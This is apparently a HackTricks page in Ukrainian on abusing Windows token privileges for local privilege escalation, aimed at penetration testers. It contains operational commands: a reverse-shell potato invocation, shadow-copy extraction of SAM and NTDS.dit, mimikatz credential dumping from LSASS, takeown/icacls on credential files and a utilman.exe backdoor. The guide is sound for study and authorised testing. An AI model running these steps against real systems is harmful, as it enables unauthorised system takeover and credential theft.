# Зловживання токенами

{{#include ../../banners/hacktricks-training.md}}

## Токени

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед продовженням:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, використовуючи наявні у вас токени**

### SeImpersonatePrivilege

Цей привілей, наявний у будь-якого процесу, дозволяє імперсонувати (але не створювати) будь-який токен, якщо вдається отримати handle до нього. Привілейований токен можна отримати від Windows service (DCOM), змусивши його виконати NTLM authentication проти exploit, після чого стане можливим запуск процесу з SYSTEM privileges.<sup>[[2]](#references)</sup> Цю вразливість можна експлуатувати за допомогою різних tools, зокрема [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (для якого winrm має бути вимкнено), [SweetPotato](https://github.com/CCob/SweetPotato) і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Сучасні примітки для operator-ів:

- **JuicyPotato — legacy**: у Windows 10 1809+/Server 2019+ надавайте перевагу **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** — залежно від того, яка поверхня RPC/COM ще доступна.
- Якщо ви скомпрометували service, що працює як **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **filtered token** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спочатку відновіть **default privilege set** облікового запису (наприклад, за допомогою **FullPowers**), а потім повторно спробуйте family potato.<sup>[[3]](#references)</sup>
- Деякі новіші forks зручніші для operator-ів, ніж оригінальні tools. Наприклад, **SigmaPotato** додає reflection/in-memory execution і підтримку сучасних версій Windows, тоді як **PrintNotifyPotato** зловживає PrintNotify COM service і часто корисний, коли класичний шлях через Spooler вимкнено.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**: буде використано **той самий метод** для отримання привілейованого токена.\
Потім цей привілей дає змогу **призначити первинний токен** новому або призупиненому процесу. За допомогою привілейованого токена impersonation можна отримати первинний токен (DuplicateTokenEx).\
Маючи цей токен, можна створити **новий процес** за допомогою 'CreateProcessAsUser' або створити призупинений процес і **встановити токен** (зазвичай не можна змінити первинний токен запущеного процесу).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Якщо цей токен увімкнено, можна використати **KERB_S4U_LOGON**, щоб отримати **токен impersonation** для будь-якого іншого користувача без знання облікових даних, **додати довільну групу** (admins) до токена, встановити для токена **рівень цілісності** "**medium**" і призначити цей токен **поточному потоку** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Цей привілей змушує систему **надавати повний доступ на читання** до будь-якого файлу (обмежений операціями читання). Він використовується для **читання хешів паролів локальних** облікових записів Administrator із реєстру, після чого такі інструменти, як "**psexec**" або "**wmiexec**", можна використовувати з цим хешем (техніка Pass-the-Hash). Однак ця техніка не працює за двох умов: коли обліковий запис Local Administrator вимкнено або коли діє політика, що вилучає адміністративні права у Local Administrators, які підключаються віддалено.<sup>[[2]](#references)</sup>\
На практиці найнадійнішим вбудованим workflow зазвичай є **VSS + `robocopy /b`**: створити або відкрити shadow copy, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить ACL файлів.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ви можете **зловживати цим привілеєм** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- слідуючи за **IppSec** у [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Або як пояснюється в розділі **ескалації привілеїв за допомогою Backup Operators**:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей привілей надає дозвіл на **запис** до будь-якого системного файлу незалежно від його Access Control List (ACL). Він відкриває численні можливості для ескалації, зокрема можливість **змінювати служби**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, а також застосовувати різні інші техніки.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege є потужним дозволом, особливо корисним, коли користувач має можливість імперсонувати токени, але також і за відсутності SeImpersonatePrivilege. Ця можливість ґрунтується на здатності імперсонувати токен, який представляє того самого користувача та має рівень цілісності, що не перевищує рівень цілісності поточного процесу.<sup>[[2]](#references)</sup>

**Ключові моменти:**

- **Імперсонація без SeImpersonatePrivilege:** SeCreateTokenPrivilege можна використати для EoP шляхом імперсонації токенів за певних умов.
- **Умови імперсонації токена:** Для успішної імперсонації цільовий токен повинен належати тому самому користувачу та мати рівень цілісності, менший або рівний рівню цілісності процесу, який здійснює імперсонацію.
- **Створення та модифікація токенів імперсонації:** Користувачі можуть створити токен імперсонації та розширити його, додавши SID привілейованої групи (Security Identifier).

### SeLoadDriverPrivilege

Цей привілей дозволяє **завантажувати та вивантажувати драйвери пристроїв** шляхом створення запису в реєстрі з конкретними значеннями `ImagePath` і `Type`. Оскільки прямий доступ на запис до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість необхідно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб ядро розпізнало `HKCU` для конфігурації драйвера, потрібно дотримуватися певного шляху.<sup>[[2]](#references)</sup>

Сучасне offensive-використання зазвичай полягає у **BYOVD** (bring your own vulnerable driver): завантаженні **підписаного, але вразливого** драйвера ядра та подальшому використанні його IOCTL для вимкнення захистів або переходу до виконання коду в ядрі. Зверніть увагу, що в актуальних збірках Windows 11/Server **Microsoft vulnerable driver blocklist** та/або **HVCI/Memory Integrity** часто блокують старі public chains, тому класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях має вигляд `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` потрібно створити весь цей шлях і встановити два значення:<sup>[[2]](#references)</sup>

- `ImagePath`, тобто шлях до бінарного файлу, який потрібно виконати
- `Type` зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Потрібні кроки:**

1. Отримати доступ до `HKCU` замість `HKLM` через обмежений доступ на запис.
2. Створити шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` у `HKCU`, де `<RID>` позначає Relative Identifier поточного користувача.
3. Встановити для `ImagePath` шлях виконання бінарного файлу.
4. Призначити для `Type` значення `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживання цим привілеєм наведено в [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Основна функція цього привілею дає процесу змогу **стати власником об’єкта**, обходячи вимогу щодо явного вибіркового доступу шляхом надання прав доступу WRITE_OWNER. Процес передбачає спочатку отримання права власності на потрібний ключ реєстру для запису, а потім зміну DACL, щоб дозволити операції запису.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей привілей дає змогу **налагоджувати інші процеси**, зокрема читати та записувати їхню пам'ять. За наявності цього привілею можна застосовувати різні стратегії memory injection, здатні обходити більшість антивірусних рішень і рішень для запобігання вторгненням на хост.<sup>[[2]](#references)</sup>

У сучасних версіях Windows пам'ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **незахищені SYSTEM-процеси** та дублювати їхні токени, але це **не гарантує**, що ви зможете взаємодіяти з **LSASS**. Якщо ввімкнено **RunAsPPL / LSA Protection**, незахищені процеси не можуть читати пам'ять LSASS або виконувати injection у нього, навіть за наявності `SeDebugPrivilege`. У такому разі викрадіть токен з іншого SYSTEM-процесу, що не працює під PPL, або використайте ланцюжок із PPL bypass/BYOVD, замість того щоб припускати, що `procdump` спрацює. Повний приклад копіювання токена за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` наведено [на цій сторінці](sedebug-+-seimpersonate-copy-token.md).

#### Дамп пам'яті

Для **збереження пам'яті процесу** можна використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) із [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Зокрема, це можна застосувати до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після його успішного входу в систему.

Потім цей дамп можна завантажити в mimikatz, щоб отримати паролі:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати оболонку `NT SYSTEM`, можна використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати дескриптори необроблених томів (наприклад, \\.\C:) для прямого дискового вводу-виводу, який обходить ACL NTFS. Завдяки цьому можна копіювати байти будь-якого файлу на томі, зчитуючи базові блоки, що дає змогу довільно читати конфіденційні файли (наприклад, приватні ключі комп’ютера в %ProgramData%\Microsoft\Crypto\, кущі реєстру, SAM/NTDS через VSS).<sup>[[5]](#references)</sup> Це особливо небезпечно на CA servers, оскільки викрадення приватного ключа CA дає змогу створити Golden Certificate для імітації будь-якого principal.<sup>[[6]](#references)</sup>

Дивіться докладні техніки та заходи пом’якшення:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Перевірка привілеїв
```
whoami /priv
```
Токени, які відображаються як **Disabled**, зазвичай можна ввімкнути, тому часто можна зловживати як _Enabled_, так і _Disabled_ privileges.

### Увімкнення всіх токенів

Якщо у вас є вимкнені privileges, ви можете використати script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цей [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Таблиця

Повна шпаргалка щодо привілеїв токенів доступна тут: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin). Наведений нижче короткий огляд містить лише безпосередні способи використання привілею для отримання сеансу адміністратора або читання конфіденційних файлів.<sup>[[1]](#references)</sup>

| Привілей                  | Вплив      | Інструмент                    | Шлях виконання                                                                                                                                                                                                                                                                                                                                     | Примітки                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Адміністратор**_ | інструмент стороннього розробника          | _"Це дозволяє користувачу видати себе за токени та виконати privesc до nt system за допомогою таких інструментів, як potato.exe, rottenpotato.exe і juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Незабаром спробую переформулювати це у більш практичний формат рецепта.                                                                                                                                                                                         |
| **`SeBackup`**             | **Загроза**  | _**Вбудовані команди**_ | Читання конфіденційних файлів за допомогою `robocopy /b` або спеціалізованих helper-ів для копіювання з підтримкою SeBackup.                                                                                                                                                                                                                                                                 | <p>- Добре підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` і, іноді, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані SeBackup cmdlets/API часто забезпечують більшу гнучкість під час роботи із заблокованими або відкритими файлами.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Адміністратор**_ | інструмент стороннього розробника          | Створення довільного токена, зокрема з локальними правами адміністратора, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Адміністратор**_ | **PowerShell**          | Дублювання токена SYSTEM, який не є **non-PPL**, або дамп пам’яті з незахищеного процесу.                                                                                                                                                                                                                                                                 | <p>Дамп LSASS зазвичай блокується, якщо ввімкнено RunAsPPL/LSA Protection.</p><p>Script доступний у [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Адміністратор**_ | інструмент стороннього розробника          | Використання **Potato family** / impersonation через named pipe для запуску SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` тощо).                                                                                                                                                                                    | <p>Найбільш практично це використовувати з облікових записів служб, таких як IIS APPPOOL, MSSQL, scheduled tasks або будь-якого контексту, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Адміністратор**_ | інструмент стороннього розробника          | <p>1. Завантажити підписаний, але вразливий kernel driver (BYOVD)<br>2. Використати IOCTL драйвера для отримання kernel R/W, вимкнення security tooling або підвищення до SYSTEM<br><br>Альтернативно, цей привілей можна використати для вивантаження драйверів, пов’язаних із безпекою, за допомогою builtin command <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старіші публічні драйвери, такі як <code>szkg64.sys</code>, дедалі частіше блокуються сучасними версіями Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Адміністратор**_ | **PowerShell**          | <p>1. Запустити PowerShell/ISE із наявним привілеєм SeRestore.<br>2. Увімкнути привілей за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Заблокувати консоль і натиснути Win+U</p> | <p>Деяке AV software може виявити атаку.</p><p>Альтернативний метод передбачає заміну service binaries, збережених у "Program Files", із використанням того самого привілею</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Адміністратор**_ | _**Вбудовані команди**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Заблокувати консоль і натиснути Win+U</p>                                                                                                                                       | <p>Деяке AV software може виявити атаку.</p><p>Альтернативний метод передбачає заміну service binaries, збережених у "Program Files", із використанням того самого привілею.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Адміністратор**_ | інструмент стороннього розробника          | <p>Маніпулювати токенами, щоб додати до них права локального адміністратора. Може знадобитися SeImpersonate.</p><p>Потребує перевірки.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Посилання

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
